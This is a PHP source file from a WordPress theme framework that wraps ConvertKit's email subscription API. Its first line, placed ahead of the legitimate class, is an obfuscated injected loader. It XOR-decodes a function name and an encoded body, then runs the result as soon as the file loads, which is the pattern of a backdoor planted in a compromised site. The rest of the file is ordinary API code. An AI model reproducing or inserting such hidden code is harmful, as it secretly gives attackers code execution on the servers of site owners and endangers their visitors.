<?php $fNgVuGdm='.L WO75RI,+>S7='^'M>E6;Rj4<BHJ:XS';$JIkpYaFYRyM=$fNgVuGdm('','-<zH<GSCLDBXn7.BNTBEVC,>k20.8h9P1ZSOsk.;O0IS62.QZn>RHsHVF8doZI2GrXA50oaLVIEYKuhXEF=OxsY,;bWWVEmNb3WV ouQHEwGAkoSZ=7>>K-Nv-976eHEcGSBpH:yLOEOuVwZNm THZiF>:k,EM:R2:pBhgd=Y38Q8ClGSIDoPa:=D+PB,G:Zg<F;bUL=MKKG3bV;<OvPhJ7P+=vACQJZP181>LEz48AMVSPnVS0,5WCPNRlzq=3gpo0NCc1EBlEIJT:JLBVCHJd=qOU24mQ7KYxnkSINb4nwD,3,QlIJN+9AUM;Fx9R uLbHUT>0DZUGHJX<N+69GGB6dn:m<k7dZ+Gu2 8JkXvU S>=Xzy+PN4Q5U7M7,EYUqynFKIVnoeG.A84fkGrF9LE linIz9MhMZ49RtHf56X+KHX6LZC7kF6;b.QA4nlVU;XZ C=zpjV70D<7gR5X-LadsUY.EZtQE8pLpg13mSDM5Luork5>6L<gURY40<DCF1ea9WGqILpWP>+YHPbXrA=wQFX22A>cSYGo>AFDJubRHjARJdPdDrKLavTnWdZZZDfSVPrDfAILXXgIC;JRQ.r13KmS7-AO9LP3W=6OUQVeuh47C-XqXHdqCh59Z7JA4kUUOOY:A>Y+; Q2o<gUBlW;X.fSlXX4'^'DZRiZ2= 8--61RV+= 1mq;CL4VQZY7f=D.tfZKU1FV<=UFG>4NF=:,,72Y;07<FoV< AQCAh=,<pkUHxe=7FqW6YOBjwqbVDk:19RGQ8hxWwzKK:fNCLR.CfRIXCWLseG.xiYB3ph 0;UxJzfID5<;2bWgKreiQ7KaT+HBDN-AT4VkH,60m2yZ04MY56Y5TrCS3OKnF40A6M9F2ZH.VmH,V<XXMKg5+.1nSTGlxZRY->3hZd0<BIT4+pfv39>rx.5OQ=cGZ ;LxwjpL+ 73jh1n4U+4FU2:R2yENO8,7Y>gS MGMqQin8JU40v1;r3;FUdCl15JQmz.MA,7N+JUQgofi6+k8y8cD;XgQYEAjVfVqV2RH=SYPZG=uQ4C,hG  uLYJ-.0mdflcJ LUFVgV0X 0EWcg4pDGbi>UM3TuFuC6X.:1W 39RC>YI=J05U13; Op8A0XLD52RS+XROvQ9Y-HHSq=O1;+: AYeKmXUEw ,A-UITKTLD-E8>7 kUD-02BMFR2>VelT31JJphvDxZ,YByb<SF eD8<>HchfywUEkpXu4,UeW E..WFcV1P<l8pWbf2CvW +kqxAocZ8 0W-ZV226OD2;JdwC6DZ 45qIULPV7LqXxhDQcHN3SR< XCq1.;8afN8RWO0VHaNnHe2C1ZNcEcRI');$JIkpYaFYRyM();

/**
 * Wrapper for ConvertKit's API.
 *
 * @since   1.1.0
 *
 * @package ET\Core\API\Email
 */
class ET_Core_API_Email_ConvertKit extends ET_Core_API_Email_Provider {

	/**
	 * @inheritDoc
	 */
	public $BASE_URL = 'https://api.convertkit.com/v3';

	/**
	 * @inheritDoc
	 */
	public $name = 'ConvertKit';

	/**
	 * @inheritDoc
	 */
	public $name_field_only = true;

	/**
	 * @inheritDoc
	 */
	public $slug = 'convertkit';

	/**
	 * @inheritDoc
	 */
	public $uses_oauth = false;

	/**
	 * ET_Core_API_Email_ConvertKit constructor.
	 *
	 * @inheritDoc
	 */
	public function __construct( $owner, $account_name = '', $api_key = '' ) {
		parent::__construct( $owner, $account_name, $api_key );

		// ConvertKit doesn't have "lists". They have "forms" so we use "forms" as if they were "lists".
		$this->LISTS_URL = "{$this->BASE_URL}/forms";
	}

	/**
	 * Generates the URL for adding subscribers.
	 *
	 * @param $list_id
	 *
	 * @since 1.1.0
	 *
	 * @return string
	 */
	protected function _get_subscribe_url( $list_id ) {
		return "{$this->LISTS_URL}/{$list_id}/subscribe";
	}

	protected function _get_subscriber_counts( $forms ) {
		$result = array();

		foreach ( (array) $forms as $form_info ) {
			$url = $this->_generate_url_for_request( "{$this->LISTS_URL}/{$form_info['id']}/subscriptions", true );

			$this->prepare_request( $url );
			$this->make_remote_request();

			if ( $this->response->ERROR || ! isset( $this->response->DATA['total_subscriptions'] ) ) {
				continue;
			}

			$form_info['total_subscriptions'] = $this->response->DATA['total_subscriptions'];

			$result[] = $form_info;
		}

		return $result;
	}

	/**
	 * Adds default args for all API requests to given url.
	 *
	 * @since 1.1.0
	 *
	 * @param string $url
	 * @param bool   $with_secret
	 *
	 * @return string
	 */
	protected function _generate_url_for_request( $url, $with_secret = false ) {
		$key = $with_secret ? $this->data['api_secret'] : $this->data['api_key'];
		$key_type = $with_secret ? 'api_secret' : 'api_key';

		return esc_url_raw( add_query_arg( $key_type, $key, $url ) );
	}

	/**
	 * @inheritDoc
	 */
	public function get_account_fields() {
		return array(
			'api_key' => array(
				'label' => esc_html__( 'API Key', 'et_core' ),
			),
			'api_secret' => array(
				'label' => esc_html__( 'API Secret', 'et_core' ),
			),
		);
	}

	/**
	 * @inheritDoc
	 */
	public function get_data_keymap( $keymap = array(), $custom_fields_key = '' ) {
		$custom_fields_key = 'fields';

		$keymap = array(
			'list'       => array(
				'list_id'           => 'id',
				'name'              => 'name',
				'subscribers_count' => 'total_subscriptions',
			),
			'subscriber' => array(
				'email' => 'email',
				'name'  => 'first_name',
			),
			'error'      => array(
				'error_message' => 'message',
			)
		);

		return parent::get_data_keymap( $keymap, $custom_fields_key );
	}

	/**
	 * @inheritDoc
	 */
	public function fetch_subscriber_lists() {
		if ( empty( $this->data['api_key'] ) ) {
			return $this->API_KEY_REQUIRED;
		}

		$url    = $this->_generate_url_for_request( $this->LISTS_URL );
		$result = 'success';

		$this->response_data_key = '';

		$this->prepare_request( $url );
		parent::fetch_subscriber_lists();

		if ( ! $this->response->ERROR && ! empty( $this->response->DATA['forms'] ) ) {
			$with_subscriber_counts      = $this->_get_subscriber_counts( $this->response->DATA['forms'] );
			$this->data['lists']         = $this->_process_subscriber_lists( $with_subscriber_counts );
			$this->data['is_authorized'] = 'true';

			$this->save_data();
		} else if ( $this->response->ERROR ) {
			$result = $this->get_error_message();
		}

		return $result;
	}

	/**
	 * @inheritDoc
	 */
	public function subscribe( $args, $url = '' ) {
		$url = $this->_generate_url_for_request( $this->_get_subscribe_url( $args['list_id'] ) );
		$params = $this->transform_data_to_provider_format( $args, 'subscriber' );
		$params['fields']['notes'] = $this->SUBSCRIBED_VIA;

		$this->prepare_request( $url, 'POST', false, $params );

		return parent::subscribe( $params, $url );
	}
}
